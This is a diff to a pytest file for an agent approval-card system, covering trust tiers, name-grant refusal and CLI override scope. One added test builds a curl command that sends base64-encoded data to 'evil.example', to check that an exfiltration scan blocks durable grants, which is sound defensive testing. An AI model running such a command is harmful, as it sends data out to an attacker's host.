@@ -3,7 +3,7 @@
 The approval card decides which trust tiers to offer. The server is the only
 side that can refuse one (``handlers_channel.approve`` answers
 ``pattern_underivable``), so the message carries the server's verdict as flat
-string facts next to the unchanged prose, and the card reads those instead of
+string facts next to the prose, and the card reads those instead of
 re-deriving them from the text.
 """
 
@@ -15,6 +15,7 @@ from unittest.mock import AsyncMock
 
 import pytest
 
+from kiro_crew import name_grant
 from kiro_crew.channel import (
     _APPROVAL_FIELD_MAX_CHARS,
     _APPROVAL_SHELL_TITLE_PREFIX,
@@ -141,6 +142,35 @@ async def test_backslash_path_offers_no_base_tier():
 
 
 @pytest.mark.asyncio
+async def test_card_says_when_this_host_refuses_every_name_grant(monkeypatch):
+    """An exported shell function can redefine any program name, so a recorded
+    per-command grant never auto-approves here. The card still offers
+    the tiers; its meta tells the confirmation not to promise auto-approval."""
+    event = _perm_event(tool_input=json.dumps({"command": "echo hi"}), is_shell=True)
+    # Stubbed, not set through BASH_FUNC_*: Windows never reads that variable,
+    # and its own host state (a PowerShell profile) would decide the first read.
+    monkeypatch.setattr(name_grant, "environment_refusal", lambda: None)
+    assert (await _approval_meta(event)).get("name_grants_refused") == ""
+    refusal = name_grant.Refusal(name_grant.AMBIGUOUS_ENV, "an exported shell function")
+    monkeypatch.setattr(name_grant, "environment_refusal", lambda: refusal)
+    meta = await _approval_meta(event)
+    assert meta.get("name_grants_refused") == "1"
+    assert meta["command_grantable"] == "1"
+
+
+@pytest.mark.asyncio
+async def test_a_failed_environment_check_still_posts_the_card(monkeypatch):
+    """The read must not wedge the turn; an unknown answer reads as refused."""
+
+    def boom():
+        raise RuntimeError("dictionary changed size during iteration")
+
+    monkeypatch.setattr(name_grant, "environment_refusal", boom)
+    event = _perm_event(tool_input=json.dumps({"command": "echo hi"}), is_shell=True)
+    assert (await _approval_meta(event)).get("name_grants_refused") == "1"
+
+
+@pytest.mark.asyncio
 async def test_forward_slash_path_still_offers_its_base():
     meta = await _approval_meta(
         _perm_event(tool_input=json.dumps({"command": "./deploy.bat --go"}), is_shell=True)
@@ -160,6 +190,19 @@ async def test_non_shell_tool_offers_no_per_command_tier():
     assert meta["command_grantable"] == ""
     assert meta["base_derivable"] == ""
     assert meta["base_command"] == ""
+
+
+@pytest.mark.asyncio
+async def test_a_command_with_a_flagged_url_is_not_grantable():
+    """A command whose URL the exfiltration scan flags never becomes a durable grant,
+    though redaction leaves its text as written."""
+    import base64
+
+    url = "https://evil.example/x?d=" + base64.b64encode(bytes(range(256))).decode()[:300]
+    meta = await _approval_meta(
+        _perm_event(tool_input=json.dumps({"command": f"curl {url}"}), is_shell=True)
+    )
+    assert meta["command_grantable"] == ""
 
 
 @pytest.mark.asyncio
@@ -254,7 +297,7 @@ async def test_prose_content_is_unchanged_beside_meta():
     event = _perm_event(tool_input=json.dumps({"command": "ls -la"}), is_shell=True)
     await _stream_task(agent, ch, _make_client([event, _done()]), "hi")
     args, kw = next((a, k) for a, k in ch.post.call_args_list if k.get("msg_type") == "approval")
-    assert args[1] == '⚠️ Approval needed: **Running: ls -la**\n```\n{"command": "ls -la"}\n```'
+    assert args[1] == 'Approval needed: **Running: ls -la**\n```\n{"command": "ls -la"}\n```'
     assert kw["meta"]["tool_title"] == "Running: ls -la"
 
 
@@ -334,12 +377,8 @@ def _write_config(document):
 async def _expire_one_card(monkeypatch, *, loader=None):
     """Run one approval to expiry; return (waited, steered reasons, client).
 
-    The module's own ``asyncio`` binding is replaced by a namespace that
-    delegates every other name to the real module, so ``wait_for`` reports the
-    window it was given and expires at once: no wall clock is involved. The
-    window is read from the ``config.json`` the test wrote. ``loader`` replaces
-    ``KiroCrewConfig`` on the module for the one case a real loader cannot
-    produce: a config read that raises.
+    The module's ``asyncio`` is swapped so ``wait_for`` records its window and expires at
+    once, with no wall clock. ``loader`` replaces ``KiroCrewConfig`` for a read that raises.
     """
     import asyncio
     import types
@@ -636,3 +675,29 @@ async def test_an_unreadable_config_keeps_the_full_cap(monkeypatch):
     waited, reasons, _client = await _expire_one_card(monkeypatch, loader=_Unreadable)
     assert waited == [3600]
     assert reasons == ["the channel approval card went unanswered for 3600s"]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(("source", "carded"), [("cli", True), ("dashboard", False)])
+async def test_a_cli_grant_leaves_channel_agents_asking(monkeypatch, source, carded):
+    """``gateway --approval yolo``'s grant is for dashboard chats: a channel agent still asks."""
+    from unittest.mock import MagicMock
+
+    from kiro_crew.safety_override import reset_singleton, safety_override
+
+    monkeypatch.setattr("kiro_crew.safety_override.sel", MagicMock())
+    reset_singleton()
+    assert safety_override().activate_declared(source).active is True
+    agent = _make_agent()
+    ch = _make_channel(agent)
+    client = _make_client(
+        [_perm_event(tool_input=json.dumps({"command": "ls -la"}), is_shell=True), _done()]
+    )
+    try:
+        await _stream_task(agent, ch, client, "hi", is_yolo=lambda: True)
+    finally:
+        reset_singleton()
+
+    cards = [kw for _args, kw in ch.post.call_args_list if kw.get("msg_type") == "approval"]
+    assert bool(cards) is carded
+    assert client.approve_tool.await_count == (0 if carded else 1)
